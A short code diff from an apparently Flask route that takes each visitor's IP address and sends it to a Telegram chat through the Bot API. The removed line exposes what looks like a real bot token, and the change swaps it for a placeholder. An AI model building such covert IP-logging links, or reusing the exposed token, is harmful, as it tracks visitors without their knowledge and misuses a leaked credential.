@@ -30,7 +30,7 @@ def ip(id):
         ip = request.headers.get('X-Forwarded-For', request.remote_addr)
         print(ip)
         method = "sendMessage"
-        token = "1600926410:AAHhDg2O2SUBcaK8UGt_V5Mb8oxdAi71OPI"
+        token = ". . ."
         url = f"https://api.telegram.org/bot{token}/{method}"
         data = {"chat_id": id, "text": str(ip) + ' new IP!'}
         requests.post(url, data=data)
